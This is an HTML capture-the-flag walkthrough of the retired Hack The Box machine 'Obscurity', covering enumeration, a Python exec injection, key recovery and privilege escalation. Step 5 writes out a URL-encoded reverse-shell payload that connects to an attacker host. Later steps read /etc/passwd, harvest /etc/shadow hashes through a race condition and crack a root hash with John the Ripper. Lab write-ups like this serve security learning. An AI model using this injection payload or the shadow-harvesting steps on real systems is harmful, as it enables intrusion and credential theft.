<html>

<head>
    <title>VulnHub Write-up: Hacker Fest 2019</title>
    <link rel="stylesheet" type="text/css" href="index.css">
</head>

<body>
    <article>
        <h1>HTB Walkthrough | Obscurity</h1>
        <div class="tag-container">
            <span class="tag">htb</span>
            <span class="tag">linux</span>
            <span class="tag">python</span>
            <span class="tag">crypto</span>
        </div>
        <p class="last-update">Last updated on May 2020.</p>

        <p class="intro">
            Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/219" target="_blank">here</a>.
        </p>

        <div class="step">
            <p>1. After doing an initial scan with nmap, we find that this is a Linux (Ubuntu) machine with 2 exposed services: OpenSSH on port 22 and a custom web server on port 8080.</p>
            <div class="code-block">
                <div class="code-line">
                    <span class="prompt">root@kali:/#</span>
                    <code>nmap -p- -T5 -A obscurity.htb</code>
                </div>
                <br>
                <div class="code-line">
                    <code>22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</code>
                </div>
                <div class="code-line">
                    <code>8080/tcp open http-proxy BadHTTPServer</code>
                </div>
            </div>
        </div>

        <div class="step">
            <p>2. There is some content on the website which has some useful information:</p>
            <div>
                <img  class="step_img_sm"  style="display: block;" src="./imgs/obscurity/img1.png"/><br>
                <img  class="step_img_sm"  style="display: block;" src="./imgs/obscurity/img2.png"/><br>
                <img  class="step_img_sm"  style="display: block;" src="./imgs/obscurity/img3.png"/>
            </div>
        </div>

        <div class="step">
            <p>3. So, now we know there is a file called 'SuperSecureServer.py' which is in "the secret development directory". I used <a href="https://tools.kali.org/web-applications/wfuzz" target="_blank">wfuzz</a> to find it but you could probably just get it logically:</p>
            <div class="code-block">
                <div class="code-line">
                    <span class="prompt">root@kali:/#</span>
                    <code>wfuzz -w SecLists/Discovery/Web-Content/api/actions.txt --hc 404 http://obscurity.htb:8080/FUZZ/SuperSecureServer.py</code>
                </div>
            </div>
        </div>

        <div class="step">
            <p>4. The mistery directory is <strong>develop</strong>, so know we have access to the server's source code, in the form of a Python script: <a href="http://obscurity.htb:8080/develop/SuperSecureServer.py" target="_blank">http://obscurity.htb:8080/develop/SuperSecureServer.py</a>.<br>
                While analysing it, we find something interesting:</p>
            <img src="./imgs/obscurity/img4.png"/>
        </div>

        <div class="step">
            <p>5. Here's our foothold: we can exploit this <a href="https://www.w3schools.com/python/ref_func_exec.asp" target="_blank">exec</a> and get us a shell as wwwdata.</p>
            <div class="code-block">
                <div class="code-line">
                    <span class="prompt">root@kali:/#</span>
                    <code>wget http://obscurity.htb:8080/';%20s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('[ATTACKER_IP]',[ATTACKER_PORT]));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);a%20=%20'</code>
                </div>
            </div>
        </div>
        
        <div class="step">
            <p>6. Our first goal is to become robert.</p>
            <div class="code-block">
                <div class="code-line">
                    <span class="prompt">$</span>
                    <code>cat etc/passwd</code>
                </div>
                <div class="code-line">
                    <code>...</code>
                </div>
                <div class="code-line">
                    <code>robert:x:1000:1000:robert:/home/robert:/bin/bash</code>
                </div>
            </div>
        </div>
        

        <div class="step">
            <p>7. Listing the contents of robert's home directy, we get some interesting files:</p>
            <div class="code-block">
                <div class="code-line">
                    <span class="prompt">$</span>
                    <code>ls /home/robert</code>
                </div>
                <div class="code-line">
                    <code>BetterSSH/BetterSSH.py</code>
                </div>
                <div class="code-line">
                    <code>check.txt</code>
                </div>
                <div class="code-line">
                    <code>out.txt</code>
                </div>
                <div class="code-line">
                    <code>passwordreminder.txt</code>
                </div>
                <div class="code-line">
                    <code>SuperSecureCrypt.py</code>
                </div>
                <div class="code-line">
                    <code>user.txt</code>
                </div>
            </div>
            <div class="code-block">
                <div class="code-line">
                    <span class="prompt">$</span>
                    <code>cat check.txt</code>
                </div>
                <div class="code-line"></div>
                    <code>Encrypting this file with your key should result in out.txt, make sure your key is correct!</code>
                </div>
            </div>
            <div class="code-block">
                <div class="code-line">
                    <span class="prompt">$</span>
                    <code>cat out.txt</code>
                </div>
                <div class="code-line"></div>
                    <code>¦ÚÈêÚÞØÛÝÝ×ÐÊßÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐêÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäèÎÍÚÎëÑÓäáÛÌ×v$</code>
                </div>
            </div>
            <div class="code-block">
                <div class="code-line">
                    <span class="prompt">$</span>
                    <code>cat passwordreminder.txt</code>
                </div>
                <div class="code-line"></div>
                    <code>´ÑÈÌÉàÙÁÑé¯·¿</code>
                </div>
            </div>
        </div>

        <div class="step">
            <p>
                8. So, by encrypting check.txt with an unknown key we get out.txt.<br>
                Also, when use we this key to encrypt robert's password we get the content of passwordreminder.txt.<br>
                Let's create a script to find the key!
            </p>
            <img src="./imgs/obscurity/script1.png">
        </div>

        <div class="step">
            <p>9. Now that we have the key, let's use it to find robert's password!</p>
            <img src="./imgs/obscurity/script2.png">
        </div>
    

        <div class="step">
            <p>10. Now that we have the robert's password we can SSH into the machine, get the user flag and move on to root.<br>
                We start by doing some enumeration with <a href="https://github.com/rebootuser/LinEnum" target="_blank">LinEnum</a>:</p>
            <div class="code-block">
                <div class="code-line">
                    <span class="prompt">$</span>
                    <code>./LinEnum.sh</code>
                </div>
                <div class="code-line">
                    <code>...</code>
                </div>
                <div class="code-line">
                    <code>User robert may run the following commands on obscure:</code>
                </div>
                <div class="code-line">
                    <code>(ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py</code>
                </div>
                <div class="code-line">
                    <code>-e</code>
                </div>
            </div>
        </div>
        
        <div class="step">
            <p>11. Let's run BetterSSH as sudo to test this:</p>
            <div class="code-block">
                <div class="code-line">
                    <span class="prompt">$</span>
                    <code>sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py</code>
                </div>
                <div class="code-line">
                    <code>Enter username: robert</code>
                </div>
                <div class="code-line">
                    <code>Enter password: xxx</code>
                </div>
                <div class="code-line">
                    <code>Authed!</code>
                </div>
            </div>
        </div>

        <div class="step">
            <p>12. After looking at BetterSSH.py we realise there's a vulnerability we can exploit: we can read the passwords that are stored on /etc/shadow for a period of time on  /tmp/SSH/.</p>
            <img src="./imgs/obscurity/script3.png"/>
        </div>
        
        <div class="step">
            <p>13. So we create a script to print them to a file we can read after the process is finished (/tmp/o.txt):</p>
            <img src="./imgs/obscurity/script4.png"/>
        </div>

        <div class="step">
            <p>14. Finally, we use <a href="https://www.openwall.com/john/" target="_blank">JohnTheRipper</a> to crack the hash:</p>
            <div class="code-block">
                <div class="code-line">
                    <span class="prompt">root@kali:/#</span>
                    <code>echo "root:$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:18226:0:99999:7" > shadow</code>
                </div>
                <div class="code-line">
                    <span class="prompt">root@kali:/#</span>
                    <code>echo "root:x:0:0:root:/root:/bin/bash" > passwd</code>
                </div>
                <div class="code-line">
                    <span class="prompt">root@kali:/#</span>
                    <code>unshadow passwd shadow > crack.password.db</code>
                </div>
                <div class="code-line">
                    <span class="prompt">root@kali:/#</span>
                    <code>john crack.password.db</code>
                </div>
            </div>
        </div>

        <div class="step">
            <p>15. That's it, hope you enjoyed it!</p>
        </div>
    
    </article>
</body>

</html>